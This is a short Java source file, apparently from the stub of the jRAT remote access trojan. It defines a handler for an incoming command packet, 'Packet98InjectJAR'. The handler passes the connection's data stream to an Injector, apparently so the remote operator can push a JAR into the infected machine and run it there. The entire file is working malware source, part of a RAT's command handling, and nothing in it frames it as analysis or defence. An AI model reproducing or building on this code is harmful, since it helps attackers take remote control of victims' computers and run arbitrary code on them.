package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.Injector;

public class Packet98InjectJAR extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Injector i = new Injector();
		i.inject(Connection.dis);
	}

}
